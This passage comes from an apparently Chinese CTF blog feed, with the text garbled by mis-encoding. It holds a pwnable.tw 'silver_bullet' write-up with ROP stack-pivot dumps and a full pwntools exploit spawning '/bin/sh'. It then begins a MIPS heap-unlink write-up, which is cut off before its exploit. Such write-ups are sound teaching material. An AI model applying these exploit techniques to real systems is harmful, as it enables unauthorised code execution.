ä¸Šä¸€ä¸ª\0ï¼Œå¦‚æœæˆ‘ä»¬å…ˆåˆ›é€ 47ä¸ªbulletç„¶åå†powe_upä¸€ä¸ªï¼Œé‚£åœ¨strncatçš„æ—¶å€™å°±ä¼šåœ¨s+0x30çš„ä½ç½®å†™å…¥ä¸€ä¸ªå­—èŠ‚çš„\0ï¼Œå¯¼è‡´ä¹‹å‰å­˜æ”¾åœ¨è¿™é‡Œçš„sizeæ•°æ®è¢«è¦†ç›–ä¸º0ï¼Œç„¶åå†ä¹‹åçš„strlen(&amp;s) + *((_DWORD *)dest + 12)è®¡ç®—çš„ç»“æœå°±æ˜¯1äº†ã€‚</p><p>ä»è€Œæˆ‘ä»¬æœ‰äº†ç»§ç»­å‘ä¸‹æ‹¼æ¥çš„æœºä¼šï¼Œåœ¨ä¹‹åçš„æ‹¼æ¥ä¼šåœ¨s+0x30å¼€å§‹æˆ‘ä»¬å¯ä»¥å…ˆä¼ªé€ sizeå¤§äº0x7fffffffï¼Œç„¶åå°±åˆ°äº†ebpçš„ä½ç½®ï¼Œä¼ªé€ ebpä¸ºbssåœ°å€ï¼Œè¿”å›åœ°å€ç”¨puts_pltè¦†ç›–ï¼Œæ¥ä¸‹æ¥å†™è¿›å»pop_ebxâ€”â€”retä½œä¸ºputsçš„è¿”å›åœ°å€æ¥æ¸…ç†æ ˆå¹¶æ¥ç€retï¼Œä¹‹åå†™putså‡½æ•°çš„å‚æ•°ä¸ºputs_gotï¼Œç„¶åå†™å…¥input_readçš„åœ°å€ï¼Œä½¿å¾—åœ¨pop_ebx_retæ—¶å»æ‰§è¡Œread_inputsï¼Œæ¥ä¸‹æ¥è®¾ç½®readçš„å‚æ•°ä¸ºä¸Šé¢çš„bssçš„æ®µå’Œè¾“å…¥çš„sizeï¼ˆå¤Ÿç”¨å°±è¡Œï¼‰ï¼Œä¹‹åè¿”å›åœ°å€å†™æˆleave_retä½¿å¾—ä¸¤æ¬¡leaveæŠŠæ ˆè¿ç§»åˆ°bsså»æ‰§è¡Œæˆ‘ä»¬input_readè¾“å…¥çš„systemã€‚</p><p>æ‹¼æ¥çš„æ•ˆæœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">15:0054â”‚ eax    0xffddc584 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">... â†“</span><br><span class="line">20:0080â”‚        0xffddc5b0 â—‚â€” 0x62616161 (&#x27;aaab&#x27;)</span><br><span class="line">21:0084â”‚        0xffddc5b4 â—‚â€” 0xffffff01        --&gt;size</span><br><span class="line">22:0088â”‚        0xffddc5b8 â€”â–¸ 0x804b410 â—‚â€” 0x0  --&gt;bss</span><br><span class="line">23:008câ”‚        0xffddc5bc â€”â–¸ 0x80484a8 â—‚â€” jmp    dword ptr [0x804afdc]  --&gt;ret_addr</span><br><span class="line">24:0090â”‚        0xffddc5c0 â€”â–¸ 0x8048475 (_init+33) â—‚â€” pop    ebx  --&gt;pop_ret</span><br><span class="line">25:0094â”‚        0xffddc5c4 â€”â–¸ 0x804afdc (_GLOBAL_OFFSET_TABLE_+24) â€”â–¸ 0xf7d88cb0 (puts) â—‚â€” push   ebp</span><br><span class="line">26:0098â”‚ edx-1  0xffddc5c8 â€”â–¸ 0x80485eb (read_input) â—‚â€” push   ebp</span><br><span class="line">27:009câ”‚        0xffddc5cc â€”â–¸ 0x8048a18 (main+196) â—‚â€” leave</span><br><span class="line">28:00a0â”‚        0xffddc5d0 â€”â–¸ 0x804b410 â—‚â€” 0x0</span><br><span class="line">29:00a4â”‚        0xffddc5d4 â—‚â€” 0x1011</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰§è¡Œbeatsè·èƒœï¼Œmainå‡½æ•°å°†æ‰§è¡Œè¿”å›</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">EAX  0x0</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fa0870 (_IO_stdfile_1_lock) â—‚â€” 0x0</span><br><span class="line"> EDI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> ESI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> EBP  0x804b410 â—‚â€” 0x0</span><br><span class="line"> ESP  0xffb8d030 â€”â–¸ 0x8048475 (_init+33) â—‚â€” pop    ebx</span><br><span class="line"> EIP  0xf7e4bcb0 (puts) â—‚â€” push   ebp</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x80489db  &lt;main+135&gt;    mov    eax, 0</span><br><span class="line">   0x80489e0  &lt;main+140&gt;    jmp    main+196 &lt;0x8048a18&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0x8048a18  &lt;main+196&gt;    leave</span><br><span class="line">   0x8048a19  &lt;main+197&gt;    ret</span><br><span class="line">    â†“</span><br><span class="line">   0x80484a8                jmp    dword ptr [0x804afdc] &lt;0xf7e4bcb0&gt;</span><br><span class="line">    â†“</span><br><span class="line"> â–º 0xf7e4bcb0 &lt;puts&gt;        push   ebp</span><br><span class="line">   0xf7e4bcb1 &lt;puts+1&gt;      mov    ebp, esp</span><br><span class="line">   0xf7e4bcb3 &lt;puts+3&gt;      push   edi</span><br><span class="line">   0xf7e4bcb4 &lt;puts+4&gt;      push   esi</span><br><span class="line">   0xf7e4bcb5 &lt;puts+5&gt;      push   ebx</span><br><span class="line">   0xf7e4bcb6 &lt;puts+6&gt;      call   __x86.get_pc_thunk.bx &lt;0xf7f0bc55&gt;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ esp  0xffb8d030 â€”â–¸ 0x8048475 (_init+33) â—‚â€” pop    ebx</span><br><span class="line">01:0004â”‚      0xffb8d034 â€”â–¸ 0x804afdc (_GLOBAL_OFFSET_TABLE_+24) â€”â–¸ 0xf7e4bcb0 (puts) â—‚â€” push   ebp</span><br><span class="line">02:0008â”‚      0xffb8d038 â€”â–¸ 0x80485eb (read_input) â—‚â€” push   ebp</span><br><span class="line">03:000câ”‚      0xffb8d03c â€”â–¸ 0x8048a18 (main+196) â—‚â€” leave</span><br><span class="line">04:0010â”‚      0xffb8d040 â€”â–¸ 0x804b410 â—‚â€” 0x0</span><br><span class="line">05:0014â”‚      0xffb8d044 â—‚â€” 0x1011</span><br><span class="line">06:0018â”‚      0xffb8d048 â€”â–¸ 0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line">07:001câ”‚      0xffb8d04c â€”â–¸ 0xf7fe7c04 â—‚â€” 0x0</span><br></pre></td></tr></table></figure><p>å…ˆæ‰§è¡Œputs(puts_got)</p><p>leakåè¿”å›åˆ°pop_rbx_retæ¸…ç†stackå¹¶è·³åˆ°read_input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">EAX  0x5</span><br><span class="line">EBX  0x804afdc (_GLOBAL_OFFSET_TABLE_+24) â€”â–¸ 0xf7e4bcb0 (puts) â—‚â€” push   ebp</span><br><span class="line">ECX  0xffffffff</span><br><span class="line">EDX  0xf7fa0870 (_IO_stdfile_1_lock) â—‚â€” 0x0</span><br><span class="line">EDI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line">ESI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line">EBP  0x804b410 â—‚â€” 0x0</span><br><span class="line">ESP  0xffb8d03c â€”â–¸ 0x8048a18 (main+196) â—‚â€” leave</span><br><span class="line">EIP  0x80485eb (read_input) â—‚â€” push   ebp</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">  0x8048475 &lt;_init+33&gt;         pop    ebx</span><br><span class="line">  0x8048476 &lt;_init+34&gt;         ret</span><br><span class="line">   â†“</span><br><span class="line">â–º 0x80485eb &lt;read_input&gt;       push   ebp</span><br><span class="line">  0x80485ec &lt;read_input+1&gt;     mov    ebp, esp</span><br><span class="line">  0x80485ee &lt;read_input+3&gt;     sub    esp, 4</span><br><span class="line">  0x80485f1 &lt;read_input+6&gt;     push   dword ptr [ebp + 0xc]</span><br><span class="line">  0x80485f4 &lt;read_input+9&gt;     push   dword ptr [ebp + 8]</span><br><span class="line">  0x80485f7 &lt;read_input+12&gt;    push   0</span><br><span class="line">  0x80485f9 &lt;read_input+14&gt;    call   0x8048490</span><br><span class="line"></span><br><span class="line">  0x80485fe &lt;read_input+19&gt;    add    esp, 0xc</span><br><span class="line">  0x8048601 &lt;read_input+22&gt;    mov    dword ptr [ebp - 4], eax</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ esp  0xffb8d03c â€”â–¸ 0x8048a18 (main+196) â—‚â€” leave</span><br><span class="line">01:0004â”‚      0xffb8d040 â€”â–¸ 0x804b410 â—‚â€” 0x0</span><br><span class="line">02:0008â”‚      0xffb8d044 â—‚â€” 0x1011</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®Œæˆå‘0x804b410è¾“å…¥payloadåè¿›è¡Œæ ˆè¿ç§»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">EAX  0x17</span><br><span class="line"> EBX  0x804afdc (_GLOBAL_OFFSET_TABLE_+24) â€”â–¸ 0xf7e4bcb0 (puts) â—‚â€” push   ebp</span><br><span class="line"> ECX  0x804b410 â—‚â€” 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> EDX  0x16</span><br><span class="line"> EDI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> ESI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0</span><br><span class="line"> EBP  0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line"> ESP  0x804b414 â€”â–¸ 0xf7e26db0 (system) â—‚â€” sub    esp, 0xc</span><br><span class="line"> EIP  0x8048a19 (main+197) â—‚â€” ret</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x804862e  &lt;read_input+67&gt;    jne    read_input+83 &lt;0x804863e&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0x804863e  &lt;read_input+83&gt;    mov    eax, dword ptr [ebp - 4]</span><br><span class="line">   0x8048641  &lt;read_input+86&gt;    leave</span><br><span class="line">   0x8048642  &lt;read_input+87&gt;    ret</span><br><span class="line">    â†“</span><br><span class="line">   0x8048a18  &lt;main+196&gt;         leave</span><br><span class="line"> â–º 0x8048a19  &lt;main+197&gt;         ret             &lt;0xf7e26db0; system&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0xf7e26db0 &lt;system&gt;           sub    esp, 0xc</span><br><span class="line">   0xf7e26db3 &lt;system+3&gt;         mov    eax, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7e26db7 &lt;system+7&gt;         call   __x86.get_pc_thunk.dx &lt;0xf7f0bc5d&gt;</span><br><span class="line"></span><br><span class="line">   0xf7e26dbc &lt;system+12&gt;        add    edx, 0x178244</span><br><span class="line">   0xf7e26dc2 &lt;system+18&gt;        test   eax, eax</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ esp  0x804b414 â€”â–¸ 0xf7e26db0 (system) â—‚â€” sub    esp, 0xc</span><br><span class="line">01:0004â”‚      0x804b418 â—‚â€” 0xdeadbeef</span><br><span class="line">02:0008â”‚      0x804b41c â€”â–¸ 0x804b420 â—‚â€” &#x27;/bin/sh&#x27;</span><br><span class="line">03:000câ”‚      0x804b420 â—‚â€” &#x27;/bin/sh&#x27;</span><br><span class="line">04:0010â”‚      0x804b424 â—‚â€” 0x68732f /* &#x27;/sh&#x27; */</span><br><span class="line">05:0014â”‚      0x804b428 â—‚â€” 0x0</span><br></pre></td></tr></table></figure><p>leave_retä¸¤æ¬¡å®Œæˆæ ˆè¿ç§»,æ‰§è¡Œpayloadï¼ï¼ğŸš©</p><p>EXPï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;./silver_bullet&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10103</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;../libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b*0x080489CF&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">47</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">puts_plt = <span class="number">0x80484a8</span></span><br><span class="line">puts_got = <span class="number">0x804afdc</span></span><br><span class="line">fake_addr = <span class="number">0x804b410</span></span><br><span class="line"></span><br><span class="line">pr_addr = <span class="number">0x08048475</span></span><br><span class="line">lr_addr = <span class="number">0x8048a18</span></span><br><span class="line">read_input = <span class="number">0x80485eb</span></span><br><span class="line">payload3 = <span class="string">&#x27;\xff&#x27;</span> * <span class="number">3</span> + p32(fake_addr) + p32(puts_plt) + p32(pr_addr) + p32(puts_got) + p32(read_input) + p32(lr_addr) + p32(fake_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#gdb,attach(p)</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Oh ! You win !!\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = puts_addr - (libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(fake_addr + <span class="number">0x10</span>) + <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æ¼æ´åœ¨äºæ•°æ®å¸ƒå±€ä¸è§„èŒƒä»¥åŠstrncatå‡½æ•°çš„ç»“å°¾æ·»åŠ \0çš„æ“ä½œğŸ•µï¸â€â™€ï¸</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mipspwn</title>
      <link href="/2020/10/16/mipspwn%E5%88%9D%E8%AF%86/"/>
      <url>/2020/10/16/mipspwn%E5%88%9D%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="mipspwn"><a href="#mipspwn" class="headerlink" title="mipspwn"></a>mipspwn</h3><blockquote><p>æœ€è¿‘é‡åˆ°çš„å¼‚æ¶æ„çš„pwné¢˜è¶Šæ¥è¶Šå¤šäº†ï¼Œä¹Ÿæ˜¯æœªæ¥pwnçš„å‘å±•è¶‹å‘ï¼Œå†³å®šå…¥å‘ä¸€ä¸‹ï¼Œå°±ä»è¥¿æ¹–è®ºå‰‘çš„ä¸€é“mipspwnå¼€å§‹è¿›å…¥mipsçš„ä¸–ç•Œå§:)</p></blockquote><span id="more"></span><p>mipsæ„æ¶ä¸‹çš„pwnå’Œx86çš„pwnä¸»è¦åŒºåˆ«åœ¨äºå¯„å­˜å™¨ï¼ŒæŒ‡ä»¤é›†çš„åŒºåˆ«ã€‚ç½‘ä¸Šåšå®¢æŒºå¤šçš„ï¼Œæˆ‘ä¸»è¦è¯´ä¸‹å¸¸è§åˆ°çš„ç‚¹ï¼ˆä¼šä¸æ–­è¡¥å……çš„ï¼‰ï¼š</p><p>1.a0,a1,a2å¯„å­˜å™¨ç”¨æ¥å‡½æ•°çš„ä¼ å‚ï¼Œå¤šçš„ç”¨æ ˆä¼ é€’ã€‚</p><p>2.fpç±»ä¼¼rbpä½†æœ‰åˆä¸åŒï¼Œret_addråœ¨fp-4ï¼Œå­˜å‚¨ä¸Šä¸€ä¸ªæ ˆå¸§çš„ä½ç½®ä¸ºfp-8ã€‚spç›¸å½“äºrspã€‚</p><p>3.mipså¸¸ç”¨shellcodeçš„åœ°å€è¦†ç›–è¿”å›åœ°å€æ¥æ‹¿shellã€‚</p><p>4.qemu-userèµ·çš„mipspwné¢˜çš„åœ°å€æ˜¯å›ºå®šçš„(åŠ¨æ€é“¾æ¥åº“ä»€ä¹ˆçš„é™¤å¤–)ï¼Œä¸”ä¸€èˆ¬ä¿æŠ¤æªæ–½éƒ½æ²¡å¼€å¯ã€‚</p><h4 id="è¥¿æ¹–è®ºå‰‘managesystem"><a href="#è¥¿æ¹–è®ºå‰‘managesystem" class="headerlink" title="è¥¿æ¹–è®ºå‰‘managesystem"></a>è¥¿æ¹–è®ºå‰‘managesystem</h4><p>mipsä¸‹pwné™æ€åˆ†æç”¨ghidraï¼Œidaåç¼–è¯‘ä¸äº†0.0</p><p>è¿™é¢˜æ¼æ´å¾ˆæ˜æ˜¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Enter the index of user you want edit: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;iStack12);</span><br><span class="line"><span class="keyword">if</span> ((iStack12 &lt; <span class="number">0</span>) || (<span class="number">0x10</span> &lt; iStack12)) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">int</span> *)(note_list + iStack12 * <span class="number">8</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nothing!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The new user\&#x27;s info: &quot;</span>);</span><br><span class="line">    sVar1 = read(<span class="number">0</span>,*(<span class="type">void</span> **)(note_list + iStack12 * <span class="number">8</span>),*(<span class="type">int</span> *)(note_list + iStack12 * <span class="number">8</span> + <span class="number">4</span>)+ <span class="number">8</span>);   <span class="comment">//å †æº¢å‡ºå¯è¦†ç›–next_chunkçš„size</span></span><br><span class="line">    <span class="keyword">if</span> (sVar1 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Some error happened!&quot;</span>);</span><br><span class="line">                  <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Edit compl</span></span><br><span class="line"><span class="string">  &#125;</span></span><br></pre></td></tr></table></figure><p>è¿™å°±å¥½åŠäº†ï¼Œç›´æ¥unlinkã€‚</p><p>å…ˆadd4æ¬¡ï¼Œæœ€åä¸€ä¸ªchunkå­˜æ”¾shellcodeï¼Œç„¶ååœ¨chunk1é‡Œæ„é€ fake_chunkåŒæ—¶æ”¹next_chunkçš„inuseä½ï¼Œmipsä¸‹æ˜¯ç›´æ¥size-1å³å¯ï¼Œä¹‹ådeleæ‰chunk2ï¼Œè§¦å‘unlinkã€‚<br>æ•ˆæœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x00411830</span><br><span class="line">00:0000â”‚   0x411830 (note_list) â€”â–¸ 0x412008 â—‚â€” &#x27;aaaaaaaaaaaaaaaaaaaaaaa&#x27;</span><br><span class="line">01:0004â”‚   0x411834 (note_list+4) â—‚â€” 0x24 /* &#x27;$&#x27; */</span><br><span class="line">02:0008â”‚   0x411838 (note_list+8) â€”â–¸ 0x411830 (note_list) â€”â–¸ 0x412008 â—‚â€” &#x27;aaaaaaaaaaaaaaaaaaaaaaa&#x27;   //unlink</span><br><span class="line">03:000câ”‚   0x41183c (note_list+12) â—‚â€” 0x34 /* &#x27;4&#x27; */</span><br><span class="line">04:0010â”‚   0x411840 (note_list+16) â€”â–¸ 0x412068 â—‚â€” &#x27;ccccccccccccccccccccccc&#x27;</span><br><span class="line">05:0014â”‚   0x411844 (note_list+20) â—‚â€” 0x34 /* &#x27;4&#x27; */</span><br><span class="line">06:0018â”‚   0x411848 (note_list+24) â€”â–¸ 0x4120a0 â—‚â€” lui    $t1, 0x6962 /* 0x3c096962 */</span><br><span class="line">07:001câ”‚   0x41184c (note_list+28) â—‚â€” 0x84</span><br></pre></td></tr></table></figure><p>ä¹‹åedit(1)æ¥æ§åˆ¶chunk0çš„æŒ‡é’ˆï¼Œé…åˆshowæ³„éœ²libc(ç”¨çš„free_got)ï¼Œå’Œstack(ç”¨çš„env(libcé‡Œçš„env)ç¯å¢ƒå˜é‡æŒ‡é’ˆ)ã€‚</p><p>ç„¶ååç§»å¾—åˆ°ret_addrï¼Œä¹‹åeditæ”¹chunk0_pträ½ret_addrï¼Œå†edit(0)æ”¹è¿”å›åœ°å€ä¸ºå­˜æ”¾shellcodeçš„chunkåœ°å€ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 